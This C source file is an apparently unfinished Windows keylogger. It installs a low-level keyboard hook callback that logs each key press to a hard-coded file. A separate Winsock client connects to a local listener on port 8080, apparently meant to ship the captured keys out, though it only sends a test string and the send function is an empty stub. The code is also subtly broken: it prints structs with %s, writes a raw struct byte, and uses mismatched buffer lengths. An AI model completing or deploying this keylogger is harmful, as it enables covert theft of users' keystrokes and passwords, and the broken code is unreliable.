#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_PORT "8080"
#define HOST_IP "127.0.0.1"
#define DEFAULT_BUFLEN 512


WSADATA wsaData;
HHOOK keyboardHook;
HANDLE filehandle;
DWORD dwBytesWritten;
char *filename = "C:\\Users\\amitz\\source\\repos\\Sniffer\\log.txt";
int writeKeyToFile(PKBDLLHOOKSTRUCT key);
int writeToSocket();

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
    //a key was pressed
    if (wParam == WM_KEYDOWN && nCode == HC_ACTION)
    {
        writeKeyToFile(key);
        printf("%s", key);
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

int main() {
    int iResult;
    int sendbuflen = DEFAULT_BUFLEN;

    /*keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);
    MSG msg = { 0 };
    while (GetMessage(&msg, NULL, 0, 0) != 0);
    UnhookWindowsHookEx(keyboardHook);*/

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed: %d\n", iResult);
        return 1;
    }
    struct addrinfo *result = NULL,
        *ptr = NULL,
        hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    

    // Resolve the server address and port
    iResult = getaddrinfo(HOST_IP, DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed: %d\n", iResult);
        WSACleanup();
        return 1;
    }
    SOCKET ConnectSocket = INVALID_SOCKET;
    // Attempt to connect to the first address returned by
    // the call to getaddrinfo
    ptr = result;

    // Create a SOCKET for connecting to server
    ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
        ptr->ai_protocol);
    if (ConnectSocket == INVALID_SOCKET) {
        printf("Error at socket(): %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }
    iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET;
    }

    char sendbuf[] = TEXT("this is a test");
    char buf_size[20] = { 0 };
    sprintf(buf_size, "%d", sizeof(sendbuf));
    
    do {
        //iResult = send(ConnectSocket, sendbuf, sizeof(sendbuf), 0);
        iResult = send(ConnectSocket, buf_size, sizeof(buf_size), 0);
        if (iResult > 0) {
            printf("Bytes sent: %d\n", iResult);
            iResult = send(ConnectSocket, sendbuf, sizeof(buf_size), 0);
            break;
        }
        else if (iResult == 0) {
            printf("Connection closed\n");
            break;
        }           
        else {
            printf("send failed: %d\n", WSAGetLastError());
            break;
        }
        Sleep(3000);
    } while (1);

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }
    return 0;
}

int writeKeyToFile(PKBDLLHOOKSTRUCT key)
{
    filehandle = CreateFileA(TEXT(filename), FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (filehandle == INVALID_HANDLE_VALUE) {
        printf("\nCould not open %s.\n", filename);
        return 1;
    }
    int ret = WriteFile(filehandle, key, 1, &dwBytesWritten, NULL);
    if (ret != 1) {
        printf("\nfailed to write %s to file.\n", key);
    }
    CloseHandle(filehandle);
    return 0;
}

int writeToSocket(){
    
    return 0;
}
